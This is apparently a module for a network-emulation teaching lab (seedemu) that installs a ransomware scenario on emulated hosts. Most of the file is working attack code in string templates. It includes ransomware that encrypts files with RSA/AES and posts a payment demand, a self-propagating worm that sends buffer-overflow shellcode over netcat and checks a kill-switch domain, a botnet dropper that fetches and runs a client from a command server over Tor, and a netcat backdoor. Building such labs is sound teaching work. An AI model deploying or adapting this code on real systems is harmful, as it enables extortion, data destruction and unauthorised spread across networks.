from __future__ import annotations
from seedemu import *
from typing import Dict
from seedemu.services.BotnetService import BotnetServer
from seedemu.compiler.Docker import DockerImage
import os

RansomwareServerFileTemplates: Dict[str, str] = {}

RansomwareServerFileTemplates['ransomware_util'] = """\
#!/usr/bin/env python3
# encoding :utf-8

from __future__ import annotations

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad, pad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import glob
import subprocess
import os
import time

class Encryption:
    '''!
    @brief Encryption Class
    '''
    
    __target_folder: str = "/tmp/tmp"
    __encrypted_file_signature: bytes = b'WANAKRY!'
    __fs_len: int = 8
    __master_pri_key: bytes
    __master_pub_key: bytes

    def saveMasterKey(self):
        priv_key, pub_key = self._generateRSAKey()

        self._saveFile("master_pub_key", pub_key)
        self._saveFile("master_priv_key", priv_key)
    
    def encryptFiles(self, master_pub_key: bytes = None, target_folder:str = None):
        assert master_pub_key != None, "master_pub_key is needed to encryptFiles"

        if master_pub_key:
            self.__master_pub_key = master_pub_key
        
        #create keypairs per victim
        priv_key, pub_key = self._generateRSAKey()
        enc_pri_key = self._RSAEncrypt(self.__master_pub_key, priv_key)
        self._saveFile("enc_priv_key",enc_pri_key)

        if target_folder:
            self.__target_folder = target_folder

        files = glob.glob(self.__target_folder+"/**/*.txt", recursive = True)
        for file in files:
            if (not self._isEncrypted(file)):
                key, iv, enc_file = self._AESEncrypt(file)
                enc_key = self._RSAEncrypt(pub_key, key)
                content = enc_key + iv + enc_file
                self._saveFile(file,self.__encrypted_file_signature+content)
        
    def decryptFiles(self, master_pri_key:bytes = None, enc_pri_key_path:str = None):
        assert master_pri_key != None, "master_pri_key is needed to decryptFiles"
        assert enc_pri_key_path != None, "enc_pri_key_path is needed to decryptFiles"

        enc_pri_key = self._readFile(enc_pri_key_path)
        pri_key = self._RSADecrypt(master_pri_key, enc_pri_key)
        
        files = glob.glob(self.__target_folder+"/**/*.txt", recursive = True)
        for file in files:
            if (self._isEncrypted):
                file_sig, enc_key, iv, enc_file = self._readEncFile(file)
                key = self._RSADecrypt(pri_key, enc_key)
                content = self._AESDecrypt(key, iv, enc_file)
                self._saveFile(file, content)


    def _AESEncrypt(self, fileName:str):
        file = self._readFile(fileName)
        key = get_random_bytes(16)
        
        cipher = AES.new(key, AES.MODE_CBC)
        enc_file = cipher.encrypt(pad(file, AES.block_size))
        
            
        return key, cipher.iv, enc_file  

    def _AESDecrypt(self, key:bytes, iv:bytes, enc_bytes:bytes) -> bytes:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        dec_bytes = unpad(cipher.decrypt(enc_bytes), AES.block_size)
        return dec_bytes


############## RSA Implementation ##############

    def _generateRSAKey(self) :
        key = RSA.generate(2048)
        priv_key = key.export_key()
        pub_key = key.publickey().export_key()

        return priv_key, pub_key

    def _RSAEncrypt(self, pub_key:bytes, plain:bytes) -> bytes:
        import_pub_key = RSA.import_key(pub_key)
        cipher_rsa = PKCS1_OAEP.new(import_pub_key)
        plain_blocks = [plain[i:i+190] for i in range(0, len(plain), 190)]
        enc = b''
        
        for plain_block in plain_blocks:
            enc_block = cipher_rsa.encrypt(plain_block)
            enc += enc_block
        return enc

    def _RSADecrypt(self, pri_key:bytes, ct:bytes) -> bytes:
        ct_blocks = [ct[i:i+256] for i in range(0, len(ct), 256)]
        pt = b''
        import_pri_key = RSA.import_key(pri_key)
        cipher_rsa = PKCS1_OAEP.new(import_pri_key)

        for ct_block in ct_blocks:
            pt_block = cipher_rsa.decrypt(ct_block)
            pt += pt_block

        return pt

############## RSA Implementation Ends ##############

    def _readFile(self, fileName:str) -> bytes:
        fd = open(fileName, "rb")
        content = fd.read()
        fd.close()
        return content

    def _readEncFile(self, fileName:str):
        fs = open(fileName, "rb")
        file_sig = fs.read(self.__fs_len)
        key = fs.read(256)
        iv = fs.read(16)
        content = fs.read()
        return file_sig, key, iv, content


    def _isEncrypted(self, fileName:str) -> bool:
        file = self._readFile(fileName)
        if(file[:self.__fs_len]==self.__encrypted_file_signature):
            return True
        else:
            return False
        

    def _saveFile(self, fileName:str, content:bytes):
        file = open(fileName, "wb")
        file.write(content)
        file.close()
    
    def setEncryptedFileSignature(self, encrypted_file_signature:str):
        self.__encrypted_file_signature = bytes(encrypted_file_signature, 'utf-8')
        self.__fs_len = len(self.__encrypted_file_signature)


class Notification():
    __msg : str 

    def __init__(self, msg:str = "you are hacked"):
        self.__msg = msg

    def setMsg(self, msg:str):
        self.__msg = msg

    def _getPTSList(self):
        result = subprocess.run(["ls", "/dev/pts"], capture_output=True)
        pts_list = result.stdout.decode('utf-8').split() 
        #print(pts_list)
        return pts_list

    def notify(self, interval: int = 2, repeat_num: int = 10):
        for i in range(repeat_num):            
            pts_list = self._getPTSList()
            for pts in pts_list:
                if pts != "ptmx":
                    with open('/dev/pts/'+pts, 'w') as output:
                        subprocess.Popen(["echo", self.__msg], stdout=output)
            time.sleep(interval)
            
    def fork(self, func: notify, args: list):
        pid = os.fork()
        if pid == 0:
            func(args[0],args[1])
            os._exit(0)
    
class BotClient():
    BotClientFileTemplates: dict[str, str] = {}

    BotClientFileTemplates['client_dropper_runner_tor'] = '''\\
        #!/bin/bash
        url="http://$1:$2/clients/droppers/client.py"
        until curl -sHf --socks5-hostname $3:$4 "$url" -o client.py > /dev/null; do {
            echo "botnet-client: server $1:$2 not ready, waiting..."
            sleep 1
        }; done
        echo "botnet-client: server ready!"
        python3 client.py &
    '''

    BotClientFileTemplates['client_dropper_runner_default'] = '''\\
        #!/bin/bash
        url="http://$1:$2/clients/droppers/client.py"
        until curl -sHf "$url" -o client.py > /dev/null; do {
            echo "botnet-client: server $1:$2 not ready, waiting..."
            sleep 1
        }; done
        echo "botnet-client: server ready!"
        python3 client.py &
    '''

    __hs_addr:str
    __hs_port:str
    __proxy_addr:str
    __proxy_addr:str
    __supports_tor:bool = False
    
    def __init__(self, hs_addr:str, hs_port:str):
        self.__hs_addr = hs_addr
        self.__hs_port = hs_port

    def enableTor(self, proxy_addr:str, proxy_port:str):
        self.__supports_tor = True
        
        if self.__supports_tor:
            self.__proxy_addr = proxy_addr
            self.__proxy_port = proxy_port

    def _saveFile(self, fileName:str, content:str):
        file = open(fileName, "w")
        file.write(content)
        file.close()

    def save_and_run_dropper_runner(self):
        if self.__supports_tor:
            self._saveFile("/tmp/byob_client_dropper_runner", self.BotClientFileTemplates['client_dropper_runner_tor'])
            subprocess.run(["chmod", "+x", "/tmp/byob_client_dropper_runner"])
            subprocess.run(["/bin/bash", "/tmp/byob_client_dropper_runner", self.__hs_addr, self.__hs_port, self.__proxy_addr, self.__proxy_port])
        else:
            self._saveFile("/tmp/byob_client_dropper_runner", self.BotClientFileTemplates['client_dropper_runner_default'])
            subprocess.run(["chmod", "+x", "/tmp/byob_client_dropper_runner"])
            subprocess.run(["/bin/bash", "/tmp/byob_client_dropper_runner", self.__hs_addr, self.__hs_port])
 
"""

RansomwareServerFileTemplates['gen_master_key'] = """\
#!/usr/bin/env python3
# encoding :utf-8

from mal.RansomwareUtil import Encryption

enc = Encryption()
enc.saveMasterKey()
"""

RansomwareServerFileTemplates['ransomware'] = """\
#!/usr/bin/env python3
# encoding :utf-8

from RansomwareUtil import Encryption
from RansomwareUtil import Notification
from RansomwareUtil import BotClient
import subprocess

# Encryption test
def encrypt(pub_key:str):
    f = open(pub_key, "rb")
    master_pub_key = f.read()
    f.close
    enc = Encryption()
    enc.encryptFiles(master_pub_key)

#notification test
def notification(interval, repeat_num, msg):
    noti = Notification()
    noti.setMsg(msg)
    noti.fork(noti.notify, [interval,repeat_num])

def main():

    encrypt("./mal/master_pub_key")
    notification({},{}, '''\{}''')
{}

if __name__ == "__main__":
    main()

"""

RansomwareServerFileTemplates['decrypt'] = """\
#!/usr/bin/env python3
# encoding :utf-8

from RansomwareUtil import Encryption

def decrypt(priv_key:str):
    try:
        f = open(priv_key, "rb")
    except:
        print("you should have to pay first.")
        return

    master_priv_key = f.read()
    f.close()
    dec = Encryption()
    dec.decryptFiles(master_priv_key, enc_pri_key_path="/bof/enc_priv_key")

decrypt("/bof/mal/master_priv_key")

"""

RansomwareServerFileTemplates['worm_script'] = """\
#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\\xeb\\x2c\\x59\\x31\\xc0\\x88\\x41\\x19\\x88\\x41\\x1c\\x31\\xd2\\xb2\\xd0\\x88"
   "\\x04\\x11\\x8d\\x59\\x10\\x89\\x19\\x8d\\x41\\x1a\\x89\\x41\\x04\\x8d\\x41\\x1d"
   "\\x89\\x41\\x08\\x31\\xc0\\x89\\x41\\x0c\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xcf"
   "\\xff\\xff\\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8080 > mal.zip; nc -nvlk 5555&  unzip mal.zip;     "
   " python3 ./mal/worm.py&  python3 ./mal/ransomware.py&      *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd614  # Need to change
   offset = 116  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)

def isAttacked(ipaddr:str):
   process = subprocess.run(f"nc -w3 {ipaddr} 5555", shell=True, capture_output=True)
   result = process.returncode
   if result == 0:
      return True
   else:
      return False

def checkKillSwitch():
   domain = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
   process = subprocess.run(f"ping -q -c1 -W1 {domain}", shell=True, capture_output=True)
   result = process.returncode
   if result != 2:
      print(f"KillSwitch is enabled", flush = True)
      return True
   else:
      print(f"KillSwitch is disabled", flush = True)
      return False

# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   while True:
      ip = ["10", str(randint(150, 171)), "0", str(randint(70, 75))]
      ipaddr = ".".join(ip)
      process = subprocess.run(f"nc -w3 {ipaddr} 9090", shell=True, capture_output=True)
      result = process.returncode

      if result != 0:
         print(f"{ipaddr}:9090 is not alive", flush = True)
         continue
      else:
         print(f"***{ipaddr}:9090 is alive", flush=True)
         if isAttacked(ipaddr):
            print(f"***{ipaddr}:9090 is attacked already", flush=True)
            continue
         else:
            print(f"***{ipaddr}:9090 is not attacked yet, launch the attack", flush=True)
            return ipaddr


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# This is for checking KillSwitch Domain
print(f"***************************************", flush=True)
print(f">>>>> Checking KillSwitch Domain <<<<<", flush=True)
print(f"***************************************", flush=True)
if checkKillSwitch():
   print(f">>>>> Attack Terminated <<<<<", flush=True)
   exit(0)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
    subprocess.run([f"cat mal.zip | nc -w5 {targetIP} 8080"], shell=True)
    # Give the shellcode some time to run on the target host
    time.sleep(1)


    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    # exit(0)

"""

RansomwareServerFileTemplates['supports_bot'] = """\
    hs_addr = "10.170.0.99"
    hs_port = "446"

    bot = BotClient(hs_addr, hs_port)
    bot.save_and_run_dropper_runner()
"""

RansomwareServerFileTemplates['supports_bot_tor'] = """\
    hs_addr = ""
    hs_port = "446"

    proxy_addr = ""
    proxy_port = "9050"

    bot = BotClient(hs_addr, hs_port)
    bot.enableTor(proxy_addr, proxy_port)
    bot.save_and_run_dropper_runner()
"""

RansomwareServerFileTemplates['backdoor_for_decrypt_key'] = """\
    #bot is not supported
    #open 7070 port for decrypt_key
    subprocess.run(f"nc -nvl 7070 > ./mal/master_priv_key &", shell=True)
"""

BYOB_VERSION='3924dd6aea6d0421397cdf35f692933b340bfccf'


class RansomwareServer(BotnetServer):
    """!
    @brief The RansomwareServer class.
    """
    __noti_interval: int = 2
    __noti_repeat_num: int = 10
    __noti_msg: str = "\n your files have been encrypted\n if you want a decryption key, pay $100.\n When I check a payment, I will send you the decryption key. \n when you get the decyprtion key, all you have to do is run the decypt script : (python3 decyption.py)"
    __byob_client: str
    __byob_loader: str
    __byob_payloads: str
    __byob_stagers: str
    __is_botnet_enabled: bool = False
    __is_tor_enabled: bool = False
    
    def supportBotnet(self, is_botnet_enabled:bool)->RansomwareServer:
        self.__is_botnet_enabled = is_botnet_enabled
        return self

    def supportTor(self, is_tor_enabled:bool)->RansomwareServer:
        if is_tor_enabled:
            assert self.__is_botnet_enabled, "botnet should be enabled to support tor"
        self.__is_tor_enabled = is_tor_enabled
        return self

    def setNoti(self, interval:int, repeat_num:int, msg:str)-> RansomwareServer:
        self.__noti_interval = interval
        self.__noti_repeat_num = repeat_num
        self.__noti_msg = msg

        return self
    
    def _getFileContent(self, file_name:str=None) -> str:
        assert file_name != None, "file_name should be identified"
        f = open(file_name, "r")
        content = f.read()
        f.close

        return content


    def install(self, node: Node):
        """!
        @brief Install the service
        """
        bot_template = RansomwareServerFileTemplates['backdoor_for_decrypt_key']
        node.addSharedFolder('/tmp/ransom', '../attack-codes')
        #For Bot-Controller Aspect 
        if self.__is_botnet_enabled:
            super().install(node)
            bot_template = RansomwareServerFileTemplates['supports_bot']
        
        if self.__is_tor_enabled:
            self.__byob_client = self._getFileContent("./byob_tor/client.py")
            self.__byob_loader = self._getFileContent("./byob_tor/loader.py")
            self.__byob_payloads = self._getFileContent("./byob_tor/payloads.py")
            self.__byob_stagers = self._getFileContent("./byob_tor/stagers.py")
            node.setFile('/tmp/byob/byob/client.py', self.__byob_client)
            node.setFile('/tmp/byob/byob/core/loader.py', self.__byob_loader)
            node.setFile('/tmp/byob/byob/core/payloads.py', self.__byob_payloads)
            node.setFile('/tmp/byob/byob/core/stagers.py', self.__byob_stagers)
            bot_template = RansomwareServerFileTemplates['supports_bot_tor']
        
        node.addSoftware('zip systemctl')
        node.addBuildCommand('pip3 uninstall pycryptodome Crypto -y && pip3 install pycryptodome Crypto')
        node.setFile('/tmp/ransom/mal/RansomwareUtil.py', RansomwareServerFileTemplates['ransomware_util'])
        node.setFile('/tmp/ransom/gen_master_key.py', RansomwareServerFileTemplates['gen_master_key'])
        node.setFile('/tmp/ransom/mal/decrypt.py', RansomwareServerFileTemplates['decrypt'])
        node.setFile('/tmp/ransom/mal/ransomware.py', RansomwareServerFileTemplates['ransomware'].format(self.__noti_interval, self.__noti_repeat_num, self.__noti_msg, bot_template))
        node.setFile('/tmp/ransom/mal/worm.py', RansomwareServerFileTemplates['worm_script'])
        node.setFile('/tmp/ransom/worm.py', RansomwareServerFileTemplates['worm_script'])
        node.setFile('/tmp/tmp/hello.txt', 'Hello\nThis is the target file.')
        #node.appendStartCommand('nc -nvlk 445 >> /tmp/ransom/send 1>&0 </dev/null &')
        
    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'Ransomware server object.\n'

        return out


class RansomwareService(Service):
    """!
    @brief The RansomwareService class.
    """

    def __init__(self):
        """!
        @brief RansomwareService constructor
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return RansomwareServer()

    def getName(self) -> str:
        return 'RansomwareService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'RansomwareServiceLayer\n'

        return out

class RansomwareClientServer(Server):
    """!
    @brief The RansomwareServer class.
    """
    __is_botnet_enabled: bool = False

    def supportBotnet(self, is_botnet_enabled:bool)->RansomwareClientServer:
        self.__is_botnet_enabled = is_botnet_enabled
        return self

    def install(self, node: Node):
        #For Morris Worm Client Aspect
        node.appendStartCommand('rm -f /root/.bashrc && cd /bof && ./server &')
        
        #For Botnet Client Aspect 
        if self.__is_botnet_enabled:
            node.addSoftware('git cmake python3-dev gcc g++ make python3-pip')
            node.addBuildCommand('curl https://raw.githubusercontent.com/malwaredllc/byob/{}/byob/requirements.txt > /tmp/byob-requirements.txt'.format(BYOB_VERSION))
            node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')
            
        node.addSoftware('systemctl')
        #For Ransomware Client Aspect
        node.addBuildCommand('pip3 uninstall pycryptodome Crypto -y && pip3 install pycryptodome Crypto')
        node.addBuildCommand('pip3 install pysocks numpy typing_extensions')
        node.setFile('/tmp/tmp/hello.txt', 'Hello\nThis is the target file.')
    
    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'Ransomware client object.\n'

        return out

class RansomwareClientService(Service):
    """!
    @brief The RansomwareClientService class.
    """

    def __init__(self):
        """!
        @brief RansomwareClientService constructor
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return RansomwareClientServer()

    def getName(self) -> str:
        return 'RansomwareClientService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'RansomwareClientServiceLayer\n'

        return out